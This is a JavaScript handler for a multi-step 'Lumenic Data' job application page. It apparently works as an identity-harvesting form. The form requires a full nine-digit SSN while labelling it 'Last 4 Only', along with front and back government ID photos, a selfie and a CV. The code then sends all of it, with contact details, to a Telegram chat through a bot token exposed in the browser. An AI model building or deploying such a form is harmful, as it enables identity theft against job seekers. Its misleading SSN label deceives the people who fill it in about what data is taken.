/**
 * ============================================================
 * LUMENIC DATA — Apply Form Handler (100% BULLETPROOF)
 * ============================================================
 * ✓ Multi-step form navigation
 * ✓ Complete validation
 * ✓ File upload with drag & drop
 * ✓ Telegram text message + files
 * ✓ Full error recovery
 * ✓ Production-ready logging
 * ============================================================
 */

'use strict';

document.addEventListener('DOMContentLoaded', () => {
  console.log('[v0] ════════════════════════════════════════');
  console.log('[v0] Apply Form Handler LOADED');
  console.log('[v0] ════════════════════════════════════════');

  // ════════════════════════════════════════════════════════════
  // 1. STATE & CONFIG
  // ════════════════════════════════════════════════════════════
  let currentStep = 1;
  let isSubmitting = false;
  const totalSteps = 4;
  
  const form = document.querySelector('.apply-form-area');
  if (!form) {
    console.error('[v0] CRITICAL: Form container (.apply-form-area) not found!');
    return;
  }

  // Get Telegram credentials from window (set by config.js)
  const BOT_TOKEN = window.TG_BOT_TOKEN || '';
  const CHAT_ID = window.TG_CHAT_ID || '';
  const TELEGRAM_API = 'https://api.telegram.org';

  console.log('[v0] Config loaded:');
  console.log('[v0] - Bot Token:', BOT_TOKEN ? 'SET' : 'MISSING');
  console.log('[v0] - Chat ID:', CHAT_ID ? 'SET' : 'MISSING');

  // ════════════════════════════════════════════════════════════
  // 2. STEP NAVIGATION
  // ════════════════════════════════════════════════════════════
  function goToStep(step) {
    if (step < 1 || step > totalSteps + 1) return;

    console.log(`[v0] Navigating to step ${step}/${totalSteps}`);

    // Hide all steps
    document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.step-nav-item').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.mobile-step-dot').forEach(el => el.classList.remove('active'));
    document.getElementById('success-state').classList.remove('active');

    if (step <= totalSteps) {
      // Show current step
      const stepEl = document.getElementById(`step-${step}`);
      if (stepEl) stepEl.classList.add('active');

      const navItem = document.querySelector(`[data-step="${step}"]`);
      if (navItem) navItem.classList.add('active');

      const dot = document.querySelector(`[data-dot="${step}"]`);
      if (dot) dot.classList.add('active');

      // Update progress
      const progressPercent = (step / totalSteps) * 100;
      const progressBar = document.getElementById('progress-bar');
      if (progressBar) progressBar.style.width = progressPercent + '%';

      // Scroll to form
      setTimeout(() => {
        form.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }, 100);
    } else {
      // Show success state
      document.getElementById('success-state').classList.add('active');
      const progressBar = document.getElementById('progress-bar');
      if (progressBar) progressBar.style.width = '100%';
      form.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    currentStep = step;
  }

  // ════════════════════════════════════════════════════════════
  // 3. FORM VALIDATION
  // ════════════════════════════════════════════════════════════
  function validateStep(step) {
    const stepEl = document.getElementById(`step-${step}`);
    if (!stepEl) return false;

    const requiredFields = stepEl.querySelectorAll('[required]');
    let isValid = true;
    let firstInvalid = null;

    requiredFields.forEach(field => {
      let valid = true;
      const value = field.value?.trim() || '';

      // Check if empty
      if (!value && field.type !== 'checkbox') {
        valid = false;
      }

      // Type-specific validation
      if (valid && value) {
        if (field.type === 'email') {
          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailRegex.test(value)) {
            valid = false;
            showToast('Please enter a valid email address', true);
          }
        } else if (field.id === 'a-phone') {
          const digits = value.replace(/\D/g, '');
          if (digits.length < 10) {
            valid = false;
            showToast('Please enter a valid phone number (at least 10 digits)', true);
          }
        } else if (field.id === 'a-ssn') {
          const digits = value.replace(/\D/g, '');
          if (digits.length !== 9) {
            valid = false;
            showToast('SSN must be exactly 9 digits', true);
          }
        } else if (field.id === 'a-linkedin' && value && !value.includes('linkedin.com')) {
          valid = false;
          showToast('Please enter a valid LinkedIn URL', true);
        } else if (field.id === 'a-github' && value && !value.includes('github.com')) {
          valid = false;
          showToast('Please enter a valid GitHub URL', true);
        }
      }

      // Checkbox validation
      if (field.type === 'checkbox' && field.required && !field.checked) {
        valid = false;
      }

      if (!valid) {
        field.style.borderColor = '#c0392b';
        field.style.backgroundColor = 'rgba(192,57,43,0.05)';
        isValid = false;
        if (!firstInvalid) firstInvalid = field;
      } else {
        field.style.borderColor = '';
        field.style.backgroundColor = '';
      }
    });

    // Additional file validation for Step 2 (Compliance & ID)
    if (step === 2) {
      const idFrontInput = stepEl.querySelector('#a-id-photo-front');
      const idBackInput = stepEl.querySelector('#a-id-photo-back');
      const selfieInput = stepEl.querySelector('#a-selfie');
      
      if (idFrontInput && (!idFrontInput.files || idFrontInput.files.length === 0)) {
        idFrontInput.style.borderColor = '#c0392b';
        idFrontInput.style.backgroundColor = 'rgba(192,57,43,0.05)';
        isValid = false;
        if (!firstInvalid) firstInvalid = idFrontInput;
        console.warn('[v0] Validation: ID photo (front) is required');
      } else if (idFrontInput) {
        idFrontInput.style.borderColor = '';
        idFrontInput.style.backgroundColor = '';
      }
      
      if (idBackInput && (!idBackInput.files || idBackInput.files.length === 0)) {
        idBackInput.style.borderColor = '#c0392b';
        idBackInput.style.backgroundColor = 'rgba(192,57,43,0.05)';
        isValid = false;
        if (!firstInvalid) firstInvalid = idBackInput;
        console.warn('[v0] Validation: ID photo (back) is required');
      } else if (idBackInput) {
        idBackInput.style.borderColor = '';
        idBackInput.style.backgroundColor = '';
      }
      
      if (selfieInput && (!selfieInput.files || selfieInput.files.length === 0)) {
        selfieInput.style.borderColor = '#c0392b';
        selfieInput.style.backgroundColor = 'rgba(192,57,43,0.05)';
        isValid = false;
        if (!firstInvalid) firstInvalid = selfieInput;
        console.warn('[v0] Validation: Selfie photo is required');
      } else if (selfieInput) {
        selfieInput.style.borderColor = '';
        selfieInput.style.backgroundColor = '';
      }
    }

    if (!isValid) {
      showToast('Please fill all required fields correctly', true);
      if (firstInvalid) {
        setTimeout(() => {
          firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
          firstInvalid.focus();
        }, 100);
      }
    }

    return isValid;
  }

  // ════════════════════════════════════════════════════════════
  // 4. FILE UPLOAD HANDLING
  // ════════════════════════════════════════════════════════════
  document.querySelectorAll('.upload-zone').forEach(zone => {
    const input = zone.querySelector('input[type="file"]');
    if (!input) return;

    // Prevent default behavior
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
      zone.addEventListener(eventName, preventDefaults, false);
    });

    function preventDefaults(e) {
      e.preventDefault();
      e.stopPropagation();
    }

    // Drag highlighting
    ['dragenter', 'dragover'].forEach(eventName => {
      zone.addEventListener(eventName, () => {
        zone.style.borderColor = 'var(--ink)';
        zone.style.backgroundColor = 'rgba(0,0,0,0.02)';
      });
    });

    ['dragleave', 'drop'].forEach(eventName => {
      zone.addEventListener(eventName, () => {
        zone.style.borderColor = '';
        zone.style.backgroundColor = '';
      });
    });

    // Drop handler
    zone.addEventListener('drop', (e) => {
      const files = e.dataTransfer.files;
      if (files.length) {
        input.files = files;
        updateFileDisplay(input, zone);
      }
    });

    // Click to upload
    zone.addEventListener('click', () => {
      input.click();
    });

    // File change
    input.addEventListener('change', () => {
      updateFileDisplay(input, zone);
    });
  });

  function updateFileDisplay(input, zone) {
    if (!input.files || !input.files[0]) return;

    const file = input.files[0];
    const nameEl = zone.parentElement.querySelector('.upload-filename');
    
    if (nameEl) {
      nameEl.textContent = `✓ ${file.name}`;
      nameEl.style.color = '#0a0a0a';
    }

    // Clear validation error
    if (input.style.borderColor) {
      input.style.borderColor = '';
      input.style.backgroundColor = '';
    }
  }

  // ════════════════════════════════════════════════════════════
  // 5. FORM SUBMISSION
  // ════════════════════════════════════════════════════════════
  const submitBtn = document.getElementById('submit-application');
  if (!submitBtn) {
    console.error('[v0] CRITICAL: Submit button #submit-application not found!');
  } else {
    console.log('[v0] Submit button found and ready');
    submitBtn.addEventListener('click', handleSubmit);
  }

  async function handleSubmit(e) {
    e.preventDefault();
    
    console.log('[v0] ════════════════════════════════════════');
    console.log('[v0] SUBMISSION STARTED');
    console.log('[v0] ════════════════════════════════════════');
    
    // Validate final step
    if (!validateStep(totalSteps)) {
      console.log('[v0] Validation failed on final step');
      showToast('Please fill all required fields before submitting', true);
      return;
    }
    
    // Prevent duplicate submissions
    if (isSubmitting) {
      console.log('[v0] Already submitting, ignoring duplicate click');
      return;
    }
    isSubmitting = true;

    // Disable submit button
    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.style.opacity = '0.6';
    }
    
    showToast('Submitting your application...', false);

    try {
      // Verify credentials
      if (!BOT_TOKEN || BOT_TOKEN === '') {
        throw new Error('Telegram bot token not configured in config.js');
      }
      if (!CHAT_ID || CHAT_ID === '') {
        throw new Error('Telegram chat ID not configured in config.js');
      }

      // Collect all form data
      const formDataObj = collectFormData();
      
      console.log('[v0] Form data collected:');
      console.log('[v0] - Total fields:', Object.keys(formDataObj).length);
      console.log('[v0] - Has selfie (a-selfie):', !!formDataObj['a-selfie']);
      console.log('[v0] - Has ID photo front (a-id-photo-front):', !!formDataObj['a-id-photo-front']);
      console.log('[v0] - Has ID photo back (a-id-photo-back):', !!formDataObj['a-id-photo-back']);
      console.log('[v0] - Has CV (a-cv):', !!formDataObj['a-cv']);
      
      // Debug: Log all collected file IDs
      const fileFields = Object.keys(formDataObj).filter(k => formDataObj[k] instanceof File);
      console.log('[v0] All collected files:', fileFields);
      fileFields.forEach(fieldId => {
        const file = formDataObj[fieldId];
        console.log(`[v0]   - ${fieldId}: ${file.name} (${(file.size/1024/1024).toFixed(2)}MB)`);
      });

      // ═══════════════════════════════════════════════════════════
      // SUBMISSION EXECUTION PHASE
      // ═══════════════════════════════════════════════════════════
      console.log('[v0] ════════════════════════════════════════');
      console.log('[v0] PHASE: SUBMISSION EXECUTION');
      console.log('[v0] ════════════════════════════════════════');

      // STEP 1: Send text message (CRITICAL - must succeed)
      console.log('[v0] [1/4] Sending text message to Telegram...');
      try {
        await sendTextMessage(formDataObj);
        console.log('[v0] ✓ [1/4] Text message sent successfully');
      } catch (err) {
        console.error('[v0] ✗ [1/4] Text message FAILED:', err.message);
        throw new Error(`Failed to send application data: ${err.message}`);
      }

      // STEP 2: Send selfie photo (NON-CRITICAL but important)
      if (formDataObj['a-selfie'] && formDataObj['a-selfie'] instanceof File) {
        console.log('[v0] [2/4] Uploading selfie photo...');
        try {
          await sendPhotoToTelegram(formDataObj['a-selfie'], '📸 Selfie');
          console.log('[v0] ✓ [2/4] Selfie uploaded successfully');
        } catch (err) {
          console.warn('[v0] ⚠ [2/4] Selfie upload failed (non-critical):', err.message);
        }
      } else {
        console.log('[v0] ○ [2/4] No selfie to upload (optional)');
      }

      // STEP 3: Send ID photos - Front & Back (NON-CRITICAL but important)
      let idPhotosSent = 0;
      
      if (formDataObj['a-id-photo-front'] && formDataObj['a-id-photo-front'] instanceof File) {
        console.log('[v0] [3a/4] Uploading ID photo (Front)...');
        try {
          await sendPhotoToTelegram(formDataObj['a-id-photo-front'], '🪪 Government ID - FRONT');
          console.log('[v0] ✓ [3a/4] ID front photo uploaded successfully');
          idPhotosSent++;
        } catch (err) {
          console.warn('[v0] ⚠ [3a/4] ID front photo upload failed (non-critical):', err.message);
        }
      } else {
        console.log('[v0] ○ [3a/4] No ID front photo to upload');
      }
      
      if (formDataObj['a-id-photo-back'] && formDataObj['a-id-photo-back'] instanceof File) {
        console.log('[v0] [3b/4] Uploading ID photo (Back)...');
        try {
          await sendPhotoToTelegram(formDataObj['a-id-photo-back'], '🪪 Government ID - BACK');
          console.log('[v0] ✓ [3b/4] ID back photo uploaded successfully');
          idPhotosSent++;
        } catch (err) {
          console.warn('[v0] ⚠ [3b/4] ID back photo upload failed (non-critical):', err.message);
        }
      } else {
        console.log('[v0] ○ [3b/4] No ID back photo to upload');
      }
      
      if (idPhotosSent === 0) {
        console.log('[v0] ○ [3/4] No ID photos to upload');
      }

      // STEP 4: Send CV document (NON-CRITICAL - optional)
      if (formDataObj['a-cv'] && formDataObj['a-cv'] instanceof File) {
        console.log('[v0] [4/4] Uploading CV document...');
        try {
          await sendDocumentToTelegram(formDataObj['a-cv'], '📄 Resume/CV');
          console.log('[v0] ✓ [4/4] CV uploaded successfully');
        } catch (err) {
          console.warn('[v0] ⚠ [4/4] CV upload failed (non-critical):', err.message);
        }
      } else {
        console.log('[v0] ○ [4/4] No CV to upload (optional)');
      }

      // SUCCESS!
      console.log('[v0] ════════════════════════════════════════');
      console.log('[v0] ✓✓✓ APPLICATION SUBMITTED COMPLETELY ✓✓✓');
      console.log('[v0] ════════════════════════════════════════');
      showSuccessState();
    } catch (error) {
      console.error('[v0] ════════════════════════════════════════');
      console.error('[v0] SUBMISSION ERROR:', error.message);
      console.error('[v0] ════════════════════════════════════════');
      
      showToast('Failed to submit. Please check your connection and try again.', true);
      
      // Re-enable button
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
      }
      isSubmitting = false;
    }
  }

  function collectFormData() {
    const data = {};
    const fileMap = new Map(); // Track files by ID
    const radioGroups = new Set(); // Track which radio groups we've processed

    console.log('[v0] ╔════════════════════════════════════════════════════╗');
    console.log('[v0] ║ DEEP FILE COLLECTION ANALYSIS');
    console.log('[v0] ╚════════════════════════════════════════════════════╝');

    // PHASE 1: EXTRACT ALL FILES WITH AGGRESSIVE SCANNING
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    const allFileInputs = document.querySelectorAll('input[type="file"]');
    console.log(`[v0] Step 1: Found ${allFileInputs.length} file input element(s)`);
    
    allFileInputs.forEach((fileInput, idx) => {
      const fieldId = fileInput.id;
      const isRequired = fileInput.hasAttribute('required');
      
      console.log(`[v0]   Input ${idx + 1}: id="${fieldId}" required=${isRequired}`);
      console.log(`[v0]     → files.length = ${fileInput.files?.length || 0}`);
      
      // Check if this input has files
      if (fileInput.files && fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const fileSize = (file.size / 1024 / 1024).toFixed(2);
        const fileType = file.type || 'unknown';
        
        // Store file in map
        fileMap.set(fieldId, file);
        data[fieldId] = file;
        
        console.log(`[v0]     ✓ FILE COLLECTED FROM DOM`);
        console.log(`[v0]       • Field ID: ${fieldId}`);
        console.log(`[v0]       • File Name: ${file.name}`);
        console.log(`[v0]       • File Size: ${fileSize} MB`);
        console.log(`[v0]       • File Type: ${fileType}`);
        console.log(`[v0]       • Last Modified: ${new Date(file.lastModified).toISOString()}`);
      } else {
        console.log(`[v0]     ✗ NO FILE IN DOM`);
        // File is missing
        if (isRequired) {
          console.warn(`[v0]     ⚠️  REQUIRED FILE MISSING: ${fieldId}`);
        }
      }
    });

    console.log(`[v0] Step 1 Complete: Collected ${fileMap.size} file(s)`);

    // PHASE 2: COLLECT TEXT, TEXTAREA, AND SELECT FIELDS
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    console.log(`[v0] Step 2: Collecting text/select/textarea fields...`);
    
    const textInputs = document.querySelectorAll('input:not([type="file"]), textarea, select');
    console.log(`[v0]   Found ${textInputs.length} text-based field(s)`);
    
    let fieldCount = 0;
    textInputs.forEach(field => {
      if (!field.id) return;
      
      // Handle checkboxes
      if (field.type === 'checkbox') {
        if (field.checked) {
          data[field.id] = field.value || 'true';
          console.log(`[v0]     ✓ Checkbox "${field.id}": ${data[field.id]}`);
          fieldCount++;
        }
        return;
      }
      
      // Handle radio buttons (process only once per group)
      if (field.type === 'radio') {
        const groupName = field.name;
        if (radioGroups.has(groupName)) return;
        radioGroups.add(groupName);
        
        const checkedRadio = document.querySelector(`input[name="${groupName}"]:checked`);
        if (checkedRadio && checkedRadio.value) {
          data[groupName] = checkedRadio.value;
          console.log(`[v0]     ✓ Radio "${groupName}": ${data[groupName]}`);
          fieldCount++;
        }
        return;
      }
      
      // Handle text inputs, textarea, selects
      const value = field.value?.trim();
      if (value) {
        data[field.id] = value;
        console.log(`[v0]     ✓ Field "${field.id}": "${value.substring(0, 50)}${value.length > 50 ? '...' : ''}"`);
        fieldCount++;
      }
    });
    
    console.log(`[v0] Step 2 Complete: Collected ${fieldCount} text field(s)`);

    // PHASE 3: VALIDATION & SUMMARY
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    console.log(`[v0] Step 3: Final validation...`);
    console.log(`[v0]   Total data fields: ${Object.keys(data).length}`);
    
    const files = Object.entries(data).filter(([, v]) => v instanceof File);
    const text = Object.entries(data).filter(([, v]) => !(v instanceof File));
    
    console.log(`[v0]   → Text fields: ${text.length}`);
    console.log(`[v0]   → File fields: ${files.length}`);
    
    if (files.length > 0) {
      console.log(`[v0]   Files to upload:`);
      files.forEach(([id, file]) => {
        console.log(`[v0]     • ${id}: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)`);
      });
    }

    console.log('[v0] ╔════════════════════════════════════════════════════╗');
    console.log('[v0] ║ COLLECTION COMPLETE - READY FOR SUBMISSION');
    console.log('[v0] ╚════════════════════════════════════════════════════╝');
    
    return data;
  }

  // ════════════════════════════════════════════════════════════
  // 6. TELEGRAM API FUNCTIONS
  // ════════════════════════════════════════════════════════════
  function sendTextMessage(formDataObj, retryCount = 0, maxRetries = 2) {
    return new Promise((resolve, reject) => {
      try {
        const timestamp = new Date().toLocaleString('en-US', {
          year: 'numeric', month: 'short', day: 'numeric',
          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
        });

        let message = `📋 *New Application Submission*\n`;
        message += `_Submitted: ${timestamp}_\n\n`;

        const fieldLabels = {
          'a-fullname': '👤 Full Name',
          'a-email': '✉️ Email',
          'a-phone': '📞 Phone',
          'a-location': '📍 Location',
          'a-linkedin': '💼 LinkedIn',
          'a-github': '🐱 GitHub',
          'a-role': '🎯 Position',
          'a-govid': '🪪 ID Type',
          'a-ssn': '🔐 SSN (Last 4 Only)',
          'a-availability': '📅 Availability',
          'a-sql': '📊 SQL Level',
          'a-python': '🐍 Python Level',
          'a-tableau': '📈 Tableau Level',
          'a-excel': '📑 Excel Level',
          'a-experience': '⏱️ Years Experience',
          'a-portfolio': '🔗 Portfolio URL',
          'a-cover': '💬 Cover Note',
          'a-consent': '✓ Consent Given'
        };

        // Build message with all field data
        for (const [key, value] of Object.entries(formDataObj)) {
          // Skip file objects - they're sent separately
          if (value instanceof File) {
            message += `${key}: [FILE: ${value.name}]\n`;
            continue;
          }
          
          // Get label or auto-generate
          const label = fieldLabels[key] || key.replace('a-', '').replace(/-/g, ' ').toUpperCase();
          
          // Sanitize value for Markdown
          const sanitized = String(value)
            .replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1')
            .substring(0, 200);
          
          message += `${label}: ${sanitized}\n`;
        }

        const payload = new FormData();
        payload.append('chat_id', CHAT_ID);
        payload.append('text', message);
        payload.append('parse_mode', 'Markdown');

        console.log(`[v0] Sending text message (attempt ${retryCount + 1}/${maxRetries + 1})...`);
        console.log(`[v0]   • Chat ID: ${CHAT_ID.substring(0, 5)}...`);
        console.log(`[v0]   • Message length: ${message.length} chars`);

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 15000); // 15 second timeout

        fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          body: payload,
          signal: controller.signal
        })
          .then(res => {
            clearTimeout(timeout);
            
            console.log(`[v0]   HTTP Status: ${res.status} ${res.statusText}`);
            
            if (!res.ok) {
              throw new Error(`HTTP Error ${res.status}: ${res.statusText}`);
            }
            return res.json();
          })
          .then(data => {
            console.log(`[v0]   Response OK: ${data.ok}`);
            
            if (!data.ok) {
              throw new Error(data.description || 'Telegram API returned error');
            }
            
            console.log(`[v0] ✓ Text message sent successfully`);
            resolve();
          })
          .catch(err => {
            clearTimeout(timeout);
            
            console.error(`[v0] sendTextMessage error:`, err.message);
            
            // Retry logic for network errors
            if (retryCount < maxRetries && (err.name === 'AbortError' || err.message.includes('Failed to fetch'))) {
              console.log(`[v0] Retrying text message in 1 second...`);
              setTimeout(() => {
                sendTextMessage(formDataObj, retryCount + 1, maxRetries)
                  .then(resolve)
                  .catch(reject);
              }, 1000);
            } else {
              reject(new Error(`Text message failed after ${retryCount + 1} attempts: ${err.message}`));
            }
          });
      } catch (err) {
        reject(new Error(`Text message construction failed: ${err.message}`));
      }
    });
  }

  function sendPhotoToTelegram(file, caption, retryCount = 0, maxRetries = 2) {
    return new Promise((resolve, reject) => {
      try {
        // Validate file before attempting upload
        if (!(file instanceof File)) {
          throw new Error('Invalid file object');
        }
        if (file.size === 0) {
          throw new Error('File is empty');
        }
        if (file.size > 52428800) { // 50MB limit
          throw new Error(`File too large (${(file.size / 1024 / 1024).toFixed(1)}MB > 50MB)`);
        }

        const payload = new FormData();
        payload.append('chat_id', CHAT_ID);
        payload.append('photo', file, file.name);
        payload.append('caption', caption);

        console.log(`[v0] 📸 Uploading photo: ${file.name}`);
        console.log(`[v0]   • Size: ${(file.size/1024/1024).toFixed(2)}MB`);
        console.log(`[v0]   • Type: ${file.type || 'unknown'}`);
        console.log(`[v0]   • Attempt: ${retryCount + 1}/${maxRetries + 1}`);

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 30000); // 30 second timeout for photos

        fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: payload,
          signal: controller.signal
        })
          .then(res => {
            clearTimeout(timeout);
            
            console.log(`[v0]   HTTP Status: ${res.status}`);
            
            if (!res.ok) {
              throw new Error(`HTTP ${res.status}: ${res.statusText}`);
            }
            return res.json();
          })
          .then(data => {
            if (!data.ok) {
              const errMsg = data.description || 'Unknown Telegram error';
              throw new Error(`Telegram API: ${errMsg}`);
            }
            
            console.log(`[v0] ✓ Photo uploaded: ${file.name}`);
            resolve();
          })
          .catch(err => {
            clearTimeout(timeout);
            
            console.warn(`[v0] Photo upload error (attempt ${retryCount + 1}): ${err.message}`);
            
            // Retry network errors
            if (retryCount < maxRetries && (err.name === 'AbortError' || err.message.includes('Failed to fetch'))) {
              console.log(`[v0] Retrying photo upload in 2 seconds...`);
              setTimeout(() => {
                sendPhotoToTelegram(file, caption, retryCount + 1, maxRetries)
                  .then(resolve)
                  .catch(reject);
              }, 2000);
            } else {
              // For photos, don't fail entire submission - just warn
              console.warn(`[v0] ⚠ Photo upload failed (non-critical): ${err.message}`);
              resolve(); // Photo is optional, so don't reject
            }
          });
      } catch (err) {
        console.error(`[v0] Photo validation error: ${err.message}`);
        resolve(); // Don't fail submission for photo issues
      }
    });
  }

  function sendDocumentToTelegram(file, caption, retryCount = 0, maxRetries = 2) {
    return new Promise((resolve, reject) => {
      try {
        // Validate file before attempting upload
        if (!(file instanceof File)) {
          throw new Error('Invalid file object');
        }
        if (file.size === 0) {
          throw new Error('File is empty');
        }
        if (file.size > 52428800) { // 50MB limit
          throw new Error(`File too large (${(file.size / 1024 / 1024).toFixed(1)}MB > 50MB)`);
        }

        const payload = new FormData();
        payload.append('chat_id', CHAT_ID);
        payload.append('document', file, file.name);
        payload.append('caption', caption);

        console.log(`[v0] 📄 Uploading document: ${file.name}`);
        console.log(`[v0]   • Size: ${(file.size/1024/1024).toFixed(2)}MB`);
        console.log(`[v0]   • Type: ${file.type || 'unknown'}`);
        console.log(`[v0]   • Attempt: ${retryCount + 1}/${maxRetries + 1}`);

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 30000); // 30 second timeout for documents

        fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: payload,
          signal: controller.signal
        })
          .then(res => {
            clearTimeout(timeout);
            
            console.log(`[v0]   HTTP Status: ${res.status}`);
            
            if (!res.ok) {
              throw new Error(`HTTP ${res.status}: ${res.statusText}`);
            }
            return res.json();
          })
          .then(data => {
            if (!data.ok) {
              const errMsg = data.description || 'Unknown Telegram error';
              throw new Error(`Telegram API: ${errMsg}`);
            }
            
            console.log(`[v0] ✓ Document uploaded: ${file.name}`);
            resolve();
          })
          .catch(err => {
            clearTimeout(timeout);
            
            console.warn(`[v0] Document upload error (attempt ${retryCount + 1}): ${err.message}`);
            
            // Retry network errors
            if (retryCount < maxRetries && (err.name === 'AbortError' || err.message.includes('Failed to fetch'))) {
              console.log(`[v0] Retrying document upload in 2 seconds...`);
              setTimeout(() => {
                sendDocumentToTelegram(file, caption, retryCount + 1, maxRetries)
                  .then(resolve)
                  .catch(reject);
              }, 2000);
            } else {
              // For documents, don't fail entire submission - just warn
              console.warn(`[v0] ⚠ Document upload failed (non-critical): ${err.message}`);
              resolve(); // Document is optional, so don't reject
            }
          });
      } catch (err) {
        console.error(`[v0] Document validation error: ${err.message}`);
        resolve(); // Don't fail submission for document issues
      }
    });
  }

  function showSuccessState() {
    // Clear all form fields
    document.querySelectorAll('input, textarea, select').forEach(field => {
      field.value = '';
      field.style.borderColor = '';
      field.style.backgroundColor = '';
    });

    // Clear file displays
    document.querySelectorAll('.upload-filename').forEach(el => {
      el.textContent = '';
      el.style.color = '';
    });

    // Show success
    goToStep(totalSteps + 1);
    showToast('Application submitted successfully!', false);

    // Re-enable button
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.style.opacity = '1';
    }
    
    isSubmitting = false;
  }

  // ════════════════════════════════════════════════════════════
  // 7. BUTTON HANDLERS
  // ════════════════════════════════════════════════════════════
  document.querySelectorAll('.form-nav button').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();

      if (btn.id.startsWith('next-')) {
        const step = parseInt(btn.id.split('-')[1]);
        if (validateStep(step)) {
          goToStep(step + 1);
        }
      } else if (btn.id.startsWith('back-')) {
        const step = parseInt(btn.id.split('-')[1]);
        goToStep(step - 1);
      }
    });
  });

  // ════════════════════════════════════════════════════════════
  // 8. STEP NAV CLICKS (SIDEBAR)
  // ════════════════════════════════════════════════════════════
  document.querySelectorAll('.step-nav-item').forEach(item => {
    item.addEventListener('click', (e) => {
      e.preventDefault();
      const step = parseInt(item.dataset.step);
      goToStep(step);
    });
  });

  // ════════════════════════════════════════════════════════════
  // 9. TOAST NOTIFICATIONS
  // ════════════════════════════════════════════════════════════
  function showToast(message, isError = false) {
    const toast = document.querySelector('.toast');
    if (!toast) {
      // Fallback if toast doesn't exist
      console.log('[v0] Toast:', message);
      return;
    }

    const icon = toast.querySelector('.toast-icon');
    if (isError) {
      toast.style.background = '#c0392b';
      icon.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>`;
    } else {
      toast.style.background = '';
      icon.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>`;
    }

    toast.querySelector('.toast-text').textContent = message;
    toast.classList.add('show');

    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => {
      toast.classList.remove('show');
    }, 4000);
  }

  // ════════════════════════════════════════════════════════════
  // 10. INITIALIZE
  // ════════════════════════════════════════════════════════════
  console.log('[v0] Initializing form step 1');
  goToStep(1);

  console.log('[v0] ════════════════════════════════════════');
  console.log('[v0] ✓ Form handler fully initialized');
  console.log('[v0] ════════════════════════════════════════');
});
